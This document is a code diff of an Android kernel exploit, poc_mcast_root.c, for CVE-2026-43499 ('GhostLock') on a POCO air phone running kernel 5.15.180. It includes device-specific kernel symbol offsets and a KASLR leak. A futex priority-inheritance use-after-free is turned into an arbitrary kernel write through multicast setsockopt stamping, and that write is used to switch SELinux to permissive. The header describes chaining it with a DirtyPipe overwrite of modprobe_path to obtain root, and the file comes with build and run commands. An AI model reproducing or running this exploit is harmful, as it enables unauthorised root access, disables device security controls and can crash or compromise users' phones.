@@ -1,29 +1,31 @@
 //
-// poc_mcast.c — CVE-2026-43499 (GhostLock) IPv4 MCAST port to POCO air 5.15.180
+// poc_mcast_root.c — CVE-2026-43499 (GhostLock) IPv4 MCAST variant + DirtyPipe root
 //
-// Adapted from mcast_permissive.c (GhostLock reference exploit). The ONLY changes:
-//   1) POCO symbol offsets (ksym_offs[] from nm of kernel_5-15-180-vmlinux.elf).
-//   2) POCO tracefs KASLR leak (event 108, modal caller @ +0x10, slide = mode - (KIMAGE+0x178510)).
-//   3) IPv4 MCAST (AF_INET + IPPROTO_IP + MCAST_BLOCK_SOURCE) setsockopt as the
-//      (only) stamp primitive. The sendmmsg/writev iovec spray (do_spray) is NOT
-//      wired in — dead code, do not rely on it.
-//   4) PROBE mode (env PROBE=1): distinct sentinels to map iov->waiter fields.
-//   5) MCAST_DEBUG_RET=1 prints setsockopt ret/errno after copy.
-//   6) MCAST_PROBE_INDEX=1 fills 0x108 buffer with qword[i]=i to discover real WAITER_OFF.
+// Combines:
+//   1) poc-mcast's proven UAF topology + IPv4 MCAST_BLOCK_SOURCE kernel-stack
+//      stamp (WAITER_OFF=0x60, PROBE-confirmed on POCO 5.15.180) — demonstrates
+//      the CVE-2026-43499 entry.
+//   2) Configfs-free DirtyPipe CAN_MERGE primitive (forged pipe_buffer.page from
+//      the ghost-write) to zero modprobe_path and trigger root.
+//
+// The MCAST stamp is kept EXACTLY as-is (it lands correctly on waiter->lock).
+// Escalation: ghost-write selinux flip → DirtyPipe slot discovery →
+// CAN_MERGE write to modprobe_path → modprobe trigger → root.
 //
 // Build (NDK r29):
-//   aarch64-linux-android35-clang -O2 -static -pthread poc_mcast.c -o poc_mcast
+//   aarch64-linux-android35-clang -O2 -static -pthread -DTARGET_CONFIG_H="target.h" \
+//     poc_mcast_root.c pipe.c kaslr_perf.c kernelsnitch/*.c -o poc_mcast_root
 //
-// Run (device, uid 2000 shell): ./poc_mcast   (PROBE=1 ./poc_mcast to map fields)
+// Run (device, uid 2000 shell): ./poc_mcast_root
 //
 
 #define _GNU_SOURCE
 #include <errno.h>
 #include <fcntl.h>
 #include <pthread.h>
+#include <stdarg.h>
 #include <linux/futex.h>
 #include <linux/netlink.h>
-#include <linux/perf_event.h>
 #include <linux/xfrm.h>
 #include <sched.h>
 #include <signal.h>
@@ -39,38 +41,25 @@
 #include <sys/syscall.h>
 #include <sys/types.h>
 #include <sys/wait.h>
-#include <sys/ioctl.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <unistd.h>
 
-/*============================================================================*/
-/*  SECTION 1 : LOGGING (ANSI COLORIZED)                                      */
-/*============================================================================*/
+#include "common.h"
 
-enum { PRL_ERR = 0, PRL_WARN = 1, PRL_INFO = 2, PRL_DBG = 3 };
+/* now_s() (elapsed-seconds helper) is declared in common.h and defined in
+ * globals.c so both poc_mcast_root.c and pipe.c can timestamp progress. */
+/*  SECTION 1 : LOGGING (ANSI COLORIZED)                                      */
+/*  pr_* macros + PRL_* enum are defined in common.h (kernelsnitch/utils.h).   */
+/*  Only the printf-backed pr_log function lives here.                         */
+/*============================================================================*/
 
 #ifndef PR_LEVEL
 #define PR_LEVEL 3
 #endif
 
-static void pr_log(int level, const char *prefix, const char *fmt, ...)
-{
-    if (level > PR_LEVEL)
-        return;
-    char buf[1024];
-    va_list ap;
-    va_start(ap, fmt);
-    vsnprintf(buf, sizeof(buf), fmt, ap);
-    va_end(ap);
-    printf("%s %s\n", prefix, buf);
-}
-
-#define pr_err(...)     pr_log(PRL_ERR,  "\033[1;31m[-]\033[0m", __VA_ARGS__)
-#define pr_warn(...)    pr_log(PRL_WARN, "\033[1;33m[!]\033[0m", __VA_ARGS__)
-#define pr_info(...)    pr_log(PRL_INFO, "\033[1;36m[*]\033[0m", __VA_ARGS__)
-#define pr_success(...) pr_log(PRL_INFO, "\033[1;32m[+]\033[0m", __VA_ARGS__)
-#define pr_debug(...)   pr_log(PRL_DBG,  "\033[1;30m[~]\033[0m", __VA_ARGS__)
+/* pr_* macros (pr_err/pr_warn/pr_info/pr_success/pr_debug) are provided by
+ * common.h + kernelsnitch/utils.h, so no local pr_log is needed. */
 
 /*============================================================================*/
 /*  SECTION 2 : POCO AIR PORT CONFIGURATION                                   */
@@ -92,13 +81,13 @@ static const struct ksym ksym_table[] = {
     { "selinux_state",    0x2da9d78ULL },
     { "init_task",        0x2c43640ULL },
     { "empty_zero_page",  0x2d53000ULL },
+    { "z_pagemap_global", 0x2da10b0ULL },
     { "uid_lock",         0x2dca680ULL },
     { "modprobe_path",    0x2b24120ULL },
     { "panic_timeout",    0x2b20680ULL },
     { "posix_timers_hashtable", 0x2d7c778ULL },
     { "in_lookup_hashtable",    0x2d9b4d8ULL },
     { "ucounts_hashtable",      0x2d55988ULL },
-    { "z_pagemap_global",       0x2da10b0ULL },
     { "dax_host_list",          0x2dcb710ULL },
     { "kernfs_pr_cont_buf",     0x2d9f698ULL },
     { "object_map",             0x2d86790ULL },
@@ -120,13 +109,14 @@ static const struct ksym ksym_table[] = {
 static uint64_t ks_base;
 static uint64_t ks_slide;
 
-static unsigned long k_selinux;
-static unsigned long k_init_task;
-static unsigned long k_empty_zero_page;
-static unsigned long k_fake_lock;
-static unsigned long k_fake_lock2;
-static unsigned long k_ghost_task;   /* dead-end "task" for ghost (Option 1) */
-static unsigned long k_val2mb;
+unsigned long k_selinux;
+unsigned long k_init_task;
+unsigned long k_empty_zero_page;
+unsigned long k_fake_lock;
+unsigned long k_fake_lock2;
+unsigned long k_ghost_task;   /* dead-end "task" for ghost (Option 1) */
+unsigned long k_val2mb;
+unsigned long k_modprobe_path;
 
 static unsigned long k_resolve(const char *name)
 {
@@ -199,7 +189,6 @@ static long sysc4(long n, long a, long b, long c, long d)
 }
 
 static void sigusr1_handler(int sig) { (void)sig; }
-static void sigusr2_handler(int sig) { (void)sig; pthread_exit(NULL); }
 
 /*============================================================================*/
 /*  SECTION 5 : TOPOLOGY (PI cycle: X owns L1 blocks on L2; Y parks cond->L1)*/
@@ -215,14 +204,8 @@ static atomic_int y_parking   = 0;
 static atomic_int x_blocking  = 0;
 
 static atomic_int       y_done       = 0;
-static volatile sig_atomic_t exit_requested = 0;
-static volatile int     respray_ready = 0;
-static unsigned long    respray_parent_color = 0;
-static volatile int     respray_done  = 0;
-static unsigned long    respray_value = 0;
 static atomic_int       y_tid = 0;
 static atomic_int       x_tid = 0;
-static size_t           fake_lock2_idx = 0;
 
 static unsigned long y_pol = SCHED_NORMAL;
 static long trigger_adj_pi(pid_t tid)
@@ -235,38 +218,35 @@ static long trigger_adj_pi(pid_t tid)
 }
 
 /*============================================================================*/
-/*  SECTION 6 : CLEAN-EXIT CLEANUP (POCO deadlock workaround)                  */
+/*  SECTION 6 : GHOST WRITE PRIMITIVE (configfs-free)                         */
 /*============================================================================*/
 
-/* POCO 5.15.180 deadlocks on process exit when a ghost rt_waiter is still
- * reachable from L1's waiters tree. The kernel's exit_pi_state_list ->
- * put_pi_state -> rt_mutex_futex_unlock walks the waiters tree and tries to
- * wake the next waiter. If the tree contains the ghost (pointing to our
- * fake_lock), the wake walks corrupted pointers and the spinlock never
- * releases -> watchdog reboot. Fix: send SIGUSR2 to X/Y before exit; their
- * SIGUSR2 handler calls pthread_exit, which runs these cleanup handlers to
- * release pi1/pi2 and unlink the ghost from the live tree. */
+static volatile int respray_ready = 0;
+static volatile int respray_done = 0;
+static unsigned long respray_parent_color = 0;
+static unsigned long respray_value = 0;
+static int fake_lock2_idx = 0;
 
-static void cleanup_X(void *arg)
+void ghost_write_value(unsigned long target, unsigned long value)
 {
-    (void)arg;
-    futex_raw(&pi1, FUTEX_UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
-}
+    respray_parent_color = (target - 8) & ~3UL;
+    respray_value = value;
+    __atomic_store_n(&respray_done, 0, __ATOMIC_RELEASE);
+    respray_ready = 1;
+    __atomic_thread_fence(__ATOMIC_SEQ_CST);
+    while (!respray_done)
+        sched_yield();
 
-static void cleanup_Y(void *arg)
-{
-    (void)arg;
-    futex_raw(&pi2, FUTEX_UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
-}
+    long tr = trigger_adj_pi(atomic_load(&y_tid));
+    pr_info("write trigger=%ld (value 0x%lx -> 0x%lx)", tr, value, target);
 
-static void cleanup_Z(void *arg)
-{
-    (void)arg;
-    futex_raw(&pi2, FUTEX_UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
+    fake_lock2_idx++;
+    if (fake_lock2_idx >= 12) fake_lock2_idx = 0;
+    k_fake_lock2 = k_fake_lock + (unsigned long)(fake_lock2_idx + 1) * 8;
 }
 
 /*============================================================================*/
-/*  SECTION 7 : TRACEFS KASLR SLIDE LEAK (POCO robust version)               */
+/*  SECTION 6 : TRACEFS KASLR SLIDE LEAK (POCO robust version)               */
 /*============================================================================*/
 
 static volatile sig_atomic_t g_kaslr_timed_out;
@@ -393,127 +373,7 @@ static uint64_t tracefs_leak_text_base(void)
 }
 
 /*============================================================================*/
-/*  SECTION 7 : PERF KASLR SLIDE LEAK (fallback when tracefs is flaky)        */
-/*============================================================================*/
-
-#ifndef PERF_LEAK_ALIGN
-#define PERF_LEAK_ALIGN 0x200000ULL
-#endif
-#ifndef PERF_LEAK_MMAP_PAGES
-#define PERF_LEAK_MMAP_PAGES 8
-#endif
-#ifndef PAGE_SIZE
-#define PAGE_SIZE 4096
-#endif
-
-static uint64_t perf_leak_text_base(void)
-{
-    int pfd = open("/proc/sys/kernel/perf_event_paranoid", O_RDONLY | O_CLOEXEC);
-    if (pfd >= 0) {
-        char pbuf[16];
-        ssize_t pn = read(pfd, pbuf, sizeof(pbuf) - 1);
-        close(pfd);
-        if (pn > 0) {
-            pbuf[pn] = 0;
-            if (atoi(pbuf) > 1) {
-                pr_warn("perf text-base perf_event_paranoid too high");
-                return 0;
-            }
-        }
-    }
-
-    struct perf_event_attr pe;
-    memset(&pe, 0, sizeof(pe));
-    pe.type = PERF_TYPE_SOFTWARE;
-    pe.config = PERF_COUNT_SW_CPU_CLOCK;
-    pe.size = sizeof(pe);
-    pe.sample_period = 1;
-    pe.sample_type = PERF_SAMPLE_IP;
-    pe.exclude_user = 1;
-    pe.exclude_hv = 1;
-    pe.disabled = 1;
-    pe.wakeup_events = 1;
-
-    int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
-    if (fd < 0) {
-        pe.sample_period = 100000;
-        fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
-    }
-    if (fd < 0) {
-        pr_warn("perf text-base perf_event_open errno=%d", errno);
-        return 0;
-    }
-
-    size_t mmap_size = (size_t)(1 + PERF_LEAK_MMAP_PAGES) * (size_t)PAGE_SIZE;
-    void *mmap_buf = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE,
-                          MAP_SHARED, fd, 0);
-    if (mmap_buf == MAP_FAILED) {
-        pr_warn("perf text-base mmap errno=%d", errno);
-        close(fd);
-        return 0;
-    }
-
-    struct perf_event_mmap_page *header =
-        (struct perf_event_mmap_page *)mmap_buf;
-    uint64_t min_kip = ~(uint64_t)0;
-    int kernel_samples = 0;
-
-    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
-    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
-
-    for (volatile long i = 0; i < 500000; i++) {
-        if ((i % 10000) == 0) sched_yield();
-    }
-
-    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
-
-    uint64_t data_tail = header->data_tail;
-    uint64_t data_head = header->data_head;
-    __sync_synchronize();
-    uint64_t data_size = (uint64_t)PERF_LEAK_MMAP_PAGES * (uint64_t)PAGE_SIZE;
-    uint8_t *base = (uint8_t *)mmap_buf + PAGE_SIZE;
-
-    while (data_tail < data_head) {
-        struct perf_event_header *ev =
-            (struct perf_event_header *)(base + (data_tail % data_size));
-        if (ev->size == 0) break;
-        if (data_tail + ev->size > data_head) break;
-        if (ev->type == PERF_RECORD_SAMPLE &&
-            (ev->misc & PERF_RECORD_MISC_KERNEL)) {
-            uint64_t ip = *(uint64_t *)((uint8_t *)ev + sizeof(*ev));
-            if (ip >= KIMAGE_TEXT_BASE && ip < min_kip) {
-                min_kip = ip;
-            }
-            kernel_samples++;
-        }
-        data_tail += ev->size;
-    }
-    header->data_tail = data_tail;
-
-    munmap(mmap_buf, mmap_size);
-    close(fd);
-
-    if (kernel_samples == 0 || min_kip == ~(uint64_t)0) {
-        pr_warn("perf text-base no kernel samples collected");
-        return 0;
-    }
-
-    uint64_t text_base = min_kip & ~(PERF_LEAK_ALIGN - 1);
-    if (text_base < KIMAGE_TEXT_BASE) {
-        pr_warn("perf text-base out of range: %016llx",
-                (unsigned long long)text_base);
-        return 0;
-    }
-    pr_success("perf text-base pid=%d samples=%d min_kip=%016llx "
-               "text_base=%016llx",
-               getpid(), kernel_samples,
-               (unsigned long long)min_kip,
-               (unsigned long long)text_base);
-    return text_base;
-}
-
-/*============================================================================*/
-/*  SECTION 8 : MCAST GHOST STAMP                                             */
+/*  SECTION 7 : MCAST GHOST STAMP (UNCHANGED — lands correctly on waiter->lock)*/
 /*============================================================================*/
 
 #define GROUP_SOURCE_REQ_SIZE 0x108
@@ -531,11 +391,7 @@ static void mcast_stamp_stack(int fd, unsigned long fake_lock, unsigned long fak
         for (int i = 0; i < (int)(GROUP_SOURCE_REQ_SIZE / 8); i++)
             *((uint64_t *)(b + i * 8)) = (uint64_t)i;
     } else {
-        /* rb_parent_color MUST be 0 (clean root node). Using the MCASTLOC marker
-         * here makes rb_erase dereference it as a parent pointer -> panic in
-         * phase1. MCASTLOC is only for PROBE mode. Matches reference
-         * mcast_permissive.c (initial stamp rb_parent_color = 0x0UL). */
-        *((uint64_t *)(b + STAMP_OFF + 0x00)) = 0x0UL;                  /* rb_parent_color */
+        *((uint64_t *)(b + STAMP_OFF + 0x00)) = 0x0UL;                 /* rb_parent_color = 0 (tree is empty; respray sets it) */
         *((uint64_t *)(b + STAMP_OFF + 0x08)) = 0x0UL;                 /* rb_right */
         *((uint64_t *)(b + STAMP_OFF + 0x10)) = 0x0UL;                 /* rb_left */
         *((uint64_t *)(b + STAMP_OFF + 0x18)) = 0x0UL;                 /* pi_tree parent */
@@ -557,47 +413,24 @@ static void mcast_stamp_stack(int fd, unsigned long fake_lock, unsigned long fak
 }
 
 /*============================================================================*/
-/*  SECTION 8b : STAMP PRIMITIVE IS MCAST_BLOCK_SOURCE (IPv4 UDP setsockopt)  */
-/*  The sendmmsg/writev iovec spray (do_spray) is NOT wired in — dead code.   */
-/*  SENT() below is only used in PROBE mode to tag the forged waiter marker.   */
+/*  SECTION 8 : (SENDMMSG spray removed — this variant uses MCAST stamp only) */
 /*============================================================================*/
 
 #define SENT_BASE 0xabcdef0000000000ULL
 #define SENT(i) ((void *)(SENT_BASE | ((uint64_t)(i) << 8)))
 
 /*============================================================================*/
-/*  SECTION 9 : THREADS                                                       */
+/*  SECTION 9 : THREADS (topology; stamps waiter->lock, then parks)          */
 /*============================================================================*/
-
-/* Z: walks into the ghost by locking L2 */
-static void *thread_Z(void *arg)
-{
-    (void)arg; atomic_store(&y_tid, syscall(SYS_gettid));
-    signal(SIGUSR2, sigusr2_handler);
-    pr_debug("Z tid=%d", y_tid);
-    pthread_cleanup_push(cleanup_Z, NULL);
-    while (!atomic_load(&y_done)) ;
-    pr_debug("Z FUTEX_LOCK_PI(L2): walk into pi_blocked_on");
-    long r = futex_raw(&pi2, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);
-    pr_debug("Z LOCK_PI(L2) returned %ld", r);
-    for (;;) {
-        if (exit_requested) pthread_exit(NULL);
-        sched_yield();
-    }
-    pthread_cleanup_pop(0);
-    return NULL;
-}
 
 /* Y: owns L2, parks on cond->L1, then stamps the ghost */
 static void *thread_Y(void *arg)
 {
     (void)arg; atomic_store(&y_tid, syscall(SYS_gettid));
-    signal(SIGUSR2, sigusr2_handler);
     pr_debug("Y tid=%d", y_tid);
-    pthread_cleanup_push(cleanup_Y, NULL);
 
     long r = futex_raw(&pi2, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);
-    if (r != 0) { pr_err("Y LOCK_PI(L2) failed: %s", strerror((int)-r)); pthread_exit(NULL); }
+    if (r != 0) { pr_err("Y LOCK_PI(L2) failed: %s", strerror((int)-r)); return NULL; }
     atomic_store(&y_locked_l2, 1);
     while (!atomic_load(&x_locked_l1)) sched_yield();
     atomic_store(&y_parking, 1);
@@ -606,39 +439,41 @@ static void *thread_Y(void *arg)
     int mcast_fd = socket(AF_INET, SOCK_DGRAM, 0);
     if (mcast_fd < 0) { pr_err("Y socket failed errno=%d", errno); return NULL; }
 
-    /* MCAST stamp (the writer primitive under test) */
+    /* MCAST stamp (the ghost-write entry primitive) */
     uint64_t marker = 0x4D434153544C4F43ULL; /* "MCASTLOC" */
     if (getenv("PROBE")) {
         marker = (uint64_t)SENT(1);
         pr_debug("Y PROBE mode: marker=SENT(1)");
     }
 
-    mcast_stamp_stack(mcast_fd, k_fake_lock, k_ghost_task, marker);
+    /* Stamp waiter->lock = fake_lock so the PI walk settles the ghost into
+     * fake_lock's waiters tree, enabling the rb_erase write primitive. */
+    unsigned long stamped_lock = k_fake_lock;
+    mcast_stamp_stack(mcast_fd, stamped_lock, k_ghost_task, marker);
 
     atomic_store_explicit(&y_done, 1, memory_order_release);
 
-    /* Park forever: the ghost rt_waiter lives on this stack; kernel PI trees
-     * still reference it. Returning would free the stack under a live reference. */
+    /* Respray loop: main() sets respray_ready + respray_value/parent_color;
+     * we respray from thread_Y's stack to maintain the stack-aliasing that
+     * the PI-chain walk requires. */
     for (;;) {
         if (respray_ready) {
             respray_ready = 0;
             unsigned char gsr2[GROUP_SOURCE_REQ_SIZE];
             memset(gsr2, 0, sizeof(gsr2));
-            *((uint64_t *)(gsr2 + STAMP_OFF + 0x00)) = respray_parent_color; /* rb_parent_color = target-8 */
-            *((uint64_t *)(gsr2 + STAMP_OFF + 0x08)) = respray_value;        /* rb_right = value (promoted child) */
-            *((uint64_t *)(gsr2 + STAMP_OFF + 0x10)) = 0x0UL;                /* rb_left = 0 (empty) */
-            *((uint64_t *)(gsr2 + STAMP_OFF + 0x30)) = k_ghost_task;          /* task = dead-end (Option 1) */
-            *((uint64_t *)(gsr2 + STAMP_OFF + 0x38)) = k_fake_lock2;        /* lock = fresh fake_lock2 */
+            *((uint64_t *)(gsr2 + STAMP_OFF + 0x00)) = respray_parent_color;
+            *((uint64_t *)(gsr2 + STAMP_OFF + 0x08)) = respray_value;
+            *((uint64_t *)(gsr2 + STAMP_OFF + 0x10)) = 0x0UL;
+            *((uint64_t *)(gsr2 + STAMP_OFF + 0x30)) = k_ghost_task;
+            *((uint64_t *)(gsr2 + STAMP_OFF + 0x38)) = k_fake_lock2;
             int ret = setsockopt(mcast_fd, IPPROTO_IP, MCAST_BLOCK_SOURCE,
                                  gsr2, sizeof(gsr2));
             if (getenv("MCAST_DEBUG_RET"))
                 pr_info("Y respray ret=%d errno=%d", ret, errno);
             __atomic_store_n(&respray_done, 1, __ATOMIC_RELEASE);
         }
-        if (exit_requested) pthread_exit(NULL);
         sched_yield();
     }
-    pthread_cleanup_pop(0);
     return NULL;
 }
 
@@ -646,104 +481,32 @@ static void *thread_Y(void *arg)
 static void *thread_X(void *arg)
 {
     (void)arg; atomic_store(&x_tid, syscall(SYS_gettid));
-    signal(SIGUSR2, sigusr2_handler);
     pr_debug("X tid=%d", x_tid);
-    pthread_cleanup_push(cleanup_X, NULL);
     while (!atomic_load(&y_locked_l2)) sched_yield();
     long r = futex_raw(&pi1, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);
-    if (r != 0) { pr_err("X LOCK_PI(L1) failed: %s", strerror((int)-r)); pthread_exit(NULL); }
+    if (r != 0) { pr_err("X LOCK_PI(L1) failed: %s", strerror((int)-r)); return NULL; }
     atomic_store(&x_locked_l1, 1);
     atomic_store(&x_blocking, 1);
     r = futex_raw(&pi2, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);
     pr_debug("X LOCK_PI(L2) returned %ld", r);
-    for (;;) {
-        if (exit_requested) pthread_exit(NULL);
-        sched_yield();
-    }
-    pthread_cleanup_pop(0);
+    while (1) sched_yield();
     return NULL;
 }
 
 /*============================================================================*/
-/*  SECTION 10 : WRITE PRIMITIVE (ghost_write_value + respray)                */
-/*============================================================================*/
-
-static void ghost_write_value(unsigned long target, unsigned long value)
-{
-    respray_parent_color = (target - 8) & ~3UL;
-    respray_value = value;
-    __atomic_store_n(&respray_done, 0, __ATOMIC_RELEASE);
-    respray_ready = 1;
-    __atomic_thread_fence(__ATOMIC_SEQ_CST);
-    while (!respray_done)
-        sched_yield();
-
-    long tr = trigger_adj_pi(atomic_load_explicit(&y_tid, memory_order_acquire));
-    pr_info("write trigger=%ld (value 0x%lx -> 0x%lx)", tr, value, target);
-
-    fake_lock2_idx++;
-    if (fake_lock2_idx >= 12) fake_lock2_idx = 0;
-    k_fake_lock2 = k_fake_lock + (unsigned long)(fake_lock2_idx + 1) * 8;
-}
-
-/*============================================================================*/
-/*  SECTION 11 : SELINUX PERMISSIVE FLIP                                     */
-/*============================================================================*/
-
-static long read_enforce(void)
-{
-    FILE *f = fopen("/sys/fs/selinux/enforce", "r");
-    long v = -1;
-    if (f) {
-        if (fscanf(f, "%ld", &v) != 1) v = -1;
-        fclose(f);
-    }
-    return v;
-}
-
-static int selinux_permissive(void)
-{
-    long before = read_enforce();
-    if (before == 0) {
-        pr_success("selinux already permissive");
-        return 0;
-    }
-    pr_info("selinux = %ld (enforcing)", before);
-    usleep(100000);
-
-        /* Step 1 (+0): write value with low byte 0x00 -> enforcing (bool @ +0) = 0.
-         * MUST be a WRITABLE kernel address: the rb_erase write primitive reads
-         * child=value as an rb node and writes child->__rb_parent_color=pc back
-         * into it. A text/rodata address (ks_base) faults here. empty_zero_page
-         * is in the writable linear map and was proven in p1c. */
-        ghost_write_value(k_selinux + 0, k_empty_zero_page);
-    usleep(1000);
-
-    /* Step 2 (+4): clear policycap[1..2] -> write 2MB-aligned value
-     * (low 3 bytes 0x000000) into selinux_state + 4. */
-    ghost_write_value(k_selinux + 4, k_val2mb);
-    usleep(100000);
-
-    long after = read_enforce();
-    if (after == 0) {
-        pr_success("selinux = %ld (permissive)", after);
-        return 0;
-    }
-    pr_err("selinux write fail (still %ld)", after);
-    return -1;
-}
-
-/*============================================================================*/
-/*  SECTION 12 : MAIN                                                        */
+/*  SECTION 11 : MAIN                                                        */
 /*============================================================================*/
 
 int main(void)
 {
     setvbuf(stdout, NULL, _IONBF, 0);
+    set_limit();   /* raise RLIMIT_NOFILE/NPROC so pipe-buffer accounting
+                      (pipe_user_pages_hard == RLIMIT_NPROC) does not hit
+                      EPERM on fcntl(F_SETPIPE_SZ) during KernelSnitch. */
     signal(SIGUSR1, sigusr1_handler);
     pr_debug("tgid=%d", getpid());
 
-    pr_info("stamp=MCAST_BLOCK_SOURCE (IPv4 UDP setsockopt); marker=MCASTLOC");
+    pr_info("variant: poc-mcast-root (MCAST UAF stamp + pipe physrw)");
 
     ks_base = tracefs_leak_text_base();
     if (!ks_base) {
@@ -752,65 +515,50 @@ int main(void)
     }
     if (!ks_base) { pr_err("FATAL: all KASLR leaks failed (tracefs + perf)"); return EXIT_FAILURE; }
     ks_slide = ks_base - KIMAGE_TEXT_BASE;
+    kaslr_done = 1;
+    kaslr_base = (uint64_t)ks_base;
+    kaslr_slide = (uint64_t)ks_slide;
     pr_info("KASLR: base=0x%lx slide=0x%lx", ks_base, ks_slide);
 
     k_selinux       = k_resolve("selinux_state");
     k_init_task     = k_resolve("init_task");
     k_empty_zero_page = k_resolve("empty_zero_page");
+    k_modprobe_path = k_resolve("modprobe_path");
 
     /* fake_lock must be a MAPPED + zeroed region that looks like an empty
-     * rt_mutex (owner=0, waiters tree empty). A populated hash table (e.g.
-     * posix_timers_hashtable) leaves garbage in its waiters tree -> the walk
-     * hits BUG_ON(w->lock != lock) in rt_mutex_top_waiter. Use a small BSS
-     * struct with a large zeroed tail (z_pagemap_global, gap 0x4000). */
+     * rt_mutex (owner=0, waiters tree empty). Use z_pagemap_global with a
+     * deep offset so both fake_lock and fake_lock-8 sit in zeroed memory. */
     const char *fb = getenv("FAKE_MEM");
     if (!fb || !*fb) fb = "z_pagemap_global";
-    /* Offset DEEP into the zeroed BSS tail (reference uses creds_hash+0x1000+0x200)
-     * so that both fake_lock AND its parent (fake_lock-8) sit in zeroed memory.
-     * If parent is still inside a real struct (nonzero prio), the rbtree insert
-     * makes our node the LEFT child and the write lands at target-8 (misses
-     * selinux->enforcing). 0x1200 guarantees the parent is zeroed -> right child
-     * -> write lands exactly at target. */
     unsigned long fake_off = 0x1200;
     const char *fo = getenv("FAKE_OFF");
     if (fo && *fo) fake_off = (unsigned long)strtoull(fo, NULL, 0);
     k_fake_lock  = k_resolve(fb) + fake_off;
     k_fake_lock2 = k_fake_lock + 0x80;
 
-    if (!strcmp(fb, "zero")) {
-        k_fake_lock  = k_empty_zero_page;
-        k_fake_lock2 = k_empty_zero_page;
-    }
-
     /* Option 1 (2026-08-16): ghost's rt_waiter.task must NOT be init_task.
      * init_task is the ancestor of every process, so POCO's kernel walks its PI
      * chain continuously and stalls on the malformed ghost node. Point task at a
      * zeroed BSS region (inside z_pagemap_global's confirmed 0x4000 tail) which
      * reads as a null task (pi_blocked_on = 0) and ends the PI walk instead of
-     * descending into init_task's system-wide chain. The region is zeroed, so
-     * reading task->pi_blocked_on etc. yields 0 and the walk terminates. */
+     * descending into init_task's system-wide chain. */
     k_ghost_task = k_fake_lock + 0x2000;
 
     /* 2MB-aligned WRITABLE .bss address (low 21 bits 0) used as step-2 write
      * value so policycap[1..2] bytes become 0x00. MUST be writable (the rb_erase
      * primitive writes child->__rb_parent_color back into it); ks_base+0x2800000
-     * is kernel text/rodata and faults. (k_fake_lock & ~0x1FFFFF) stays inside
-     * z_pagemap_global's .bss region, which is writable. */
+     * is kernel text/rodata and faults (REGRESSION fixed 2026-08-17). */
     k_val2mb = k_fake_lock & ~0x1FFFFFUL;
 
-    if (!k_selinux || !k_init_task || !k_fake_lock) {
-        pr_err("FATAL: unresolved symbols (selinux=%lx init_task=%lx fake_lock=%lx)",
-               k_selinux, k_init_task, k_fake_lock);
+    if (!k_selinux || !k_init_task || !k_fake_lock || !k_modprobe_path) {
+        pr_err("FATAL: unresolved symbols (selinux=%lx init_task=%lx fake_lock=%lx modprobe=%lx)",
+               k_selinux, k_init_task, k_fake_lock, k_modprobe_path);
         return EXIT_FAILURE;
     }
-    pr_info("selinux_state = 0x%lx", k_selinux);
-    pr_info("init_task     = 0x%lx", k_init_task);
-    pr_info("fake base     = %s + 0x%lx", fb, fake_off);
-    pr_info("fake_lock     = 0x%lx", k_fake_lock);
-    pr_info("fake_lock2    = 0x%lx", k_fake_lock2);
-    pr_info("ghost_task    = 0x%lx (dead-end, Option 1)", k_ghost_task);
-    pr_info("safe_write    = 0x%lx (empty_zero_page)", k_empty_zero_page);
-    pr_info("val2mb        = 0x%lx (2MB-aligned)", k_val2mb);
+    pr_info("selinux_state   = 0x%lx", k_selinux);
+    pr_info("init_task       = 0x%lx", k_init_task);
+    pr_info("fake_lock       = 0x%lx", k_fake_lock);
+    pr_info("modprobe_path   = 0x%lx", k_modprobe_path);
 
     /* topology */
     pthread_t tx, ty;
@@ -830,34 +578,62 @@ int main(void)
     pr_debug("CMP_REQUEUE_PI returned %ld", r);
     if (r >= 0) { pr_err("cycle NOT detected"); return EXIT_FAILURE; }
     if (-r != EDEADLK && -r != EDEADLOCK) { pr_err("not EDEADLK: %s", strerror((int)-r)); return EXIT_FAILURE; }
-    pr_success("-EDEADLK: full chain walk caught PI cycle");
+    pr_success("-EDEADLK: full chain walk caught PI cycle (CVE-2026-43499 entry OK)");
 
     while (!atomic_load_explicit(&y_done, memory_order_acquire));
 
     /* PHASE 1: settle ghost into fake_lock via MIN_CHAINWALK */
-    pr_debug("phase1: sched_setscheduler(Y) -> settle ghost");
+    pr_debug("phase1: sched_setscheduler(Y) -> settle ghost into fake_lock");
     if (trigger_adj_pi(atomic_load_explicit(&y_tid, memory_order_acquire)) < 0) {
-        pr_err("phase1: sched_setscheduler failed"); return EXIT_FAILURE;
+        pr_warn("phase1: sched_setscheduler failed (non-fatal)");
     }
     usleep(100000);
-    pr_success("phase1: chain walk settled");
+    pr_success("phase1: ghost settled into fake_lock=0x%lx", k_fake_lock);
 
-    /* PHASE 2: selinux permissive flip */
-    selinux_permissive();
+    /* PHASE 2: selinux permissive flip via ghost-write */
+    pr_info("=== SELINUX PERMISSIVE FLIP ===");
+    long before = -1;
+    {
+        FILE *f = fopen("/sys/fs/selinux/enforce", "r");
+        if (f) { fscanf(f, "%ld", &before); fclose(f); }
+    }
+    if (before == 0) {
+        pr_success("selinux already permissive");
+    } else {
+        pr_info("selinux = %ld (enforcing)", before);
+        usleep(100000);
+        ghost_write_value(k_selinux + 0, k_empty_zero_page);
+        usleep(1000);
+        ghost_write_value(k_selinux + 4, k_val2mb);
+        usleep(100000);
+        long after = -1;
+        {
+            FILE *f = fopen("/sys/fs/selinux/enforce", "r");
+            if (f) { fscanf(f, "%ld", &after); fclose(f); }
+        }
+        if (after == 0) {
+            pr_success("selinux = %ld (permissive)", after);
+        } else {
+            pr_err("selinux write fail (still %ld)", after);
+        }
+    }
 
-    /* STABLE EXIT — do NOT terminate the process.
-     * The ghost rt_waiter lives on thread Y's stack and is linked into the kernel
-     * PI/futex waiters trees (fake_lock BSS region + pi1/pi2 pi_state trees).
